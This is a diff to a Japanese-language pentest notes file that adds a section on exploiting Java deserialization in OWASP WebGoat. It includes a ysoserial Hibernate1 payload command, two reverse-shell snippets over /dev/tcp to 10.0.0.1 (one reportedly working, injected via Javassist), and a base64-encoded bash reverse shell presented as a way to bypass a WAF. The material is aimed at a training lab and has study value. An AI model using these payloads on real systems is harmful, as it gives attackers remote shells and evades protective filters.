@@ -628,10 +628,34 @@ public class Exploit implements Remote, Serializable {
   }
 }
 ```
-
-
-## 
+## ysoserial Hibernate1 / encode reverse shell payload (OWASP WEBGOAT)
+https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef  
 - **entrypoint**  
+WEBGOATのInsecure Deserializationの項目。  
+以下のBurp SuiteのJavaの逆シリアル化の脆弱性を検知できる拡張が便利そう。  
+https://github.com/federicodotta/Java-Deserialization-Scanner/blob/master/src/burp/BurpExtender.java  
+error文にHibernate1のPayloadを使えてきなヒントが出てるのかな？？  
+ysoserialのやつそのままだとうまく行かなかったらしい(修正されてるのかな？？)  
+いろいろなんやかんやして以下のようにしてPaylaodを作成したらしい。  
+```txt
+java -Dhibernate5 -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 "touch /tmp/test" | base64 -w0
+```
+以下のPentest Monkeyのやつは動かなかったらしい。  
+```txt
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+最終的に以下が動いたらしい。  
+```txt
+String cmd = "java.lang.Runtime.getRuntime().exec(new String []{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/8080;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"}).waitFor();";
+clazz.makeClassInitializer().insertAfter(cmd);
+```
+`bash -i >& /dev/tcp/[IP address]/[port] 0>&1`を以下のようにエンコードできるらしい！WAFの
+バイパスもおまけにできそうで良さげ？  
+```txt
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xLzgwODAgMD4mMQ==}|{base64,-d}|{bash,-i}
+```
 - **payload**  
 
 ## 
